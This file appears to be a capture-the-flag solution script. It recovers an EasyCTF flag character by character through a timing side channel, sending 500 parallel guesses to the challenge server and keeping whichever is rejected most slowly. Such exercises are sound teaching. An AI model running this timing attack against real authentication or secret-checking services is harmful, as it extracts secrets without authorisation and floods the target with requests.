#!/usr/bin/env python3
import socket
import time
import string
from multiprocessing.pool import ThreadPool


def time_attempt(payload):
    s = socket.socket()
    s.connect(('c1.easyctf.com', 12482))
    while True:
        data = s.recv(4096).decode().strip()
        if not data:
            end = 0
            break
        #print("Received:", data)

        if 'enter the flag:' in data:
            start = time.time()
            s.send(payload.encode() + b'\n')

        if 'no' in data:
            end = time.time()
            break
    elapsed = end-start
    return (payload, int(round(elapsed)))


def bruteforce():
    prepend = 'easyctf{'
    correct = len(prepend)

    assert time_attempt(prepend)[1] == correct
    print("Starting bruteforce")

    while '}' not in prepend:
        pool = ThreadPool(processes=500)
        results = []
        for ch in string.printable:
            async_result = pool.apply_async(time_attempt, (prepend + ch,))
            results.append(async_result)
        # wait until all done
        pool.close()
        # pool.join()

        # collate the results
        results = map(lambda r: r.get(), results)

        # get the only correct result
        results = list(filter(lambda r: r[1] > correct, results))
        assert len(results) == 1
        results = results[0]

        # save the result
        prepend = results[0]  # payload
        correct = results[1]  # time
        print(correct, prepend)

    print('Done:')
    print(prepend)


if __name__ == '__main__':
    bruteforce()
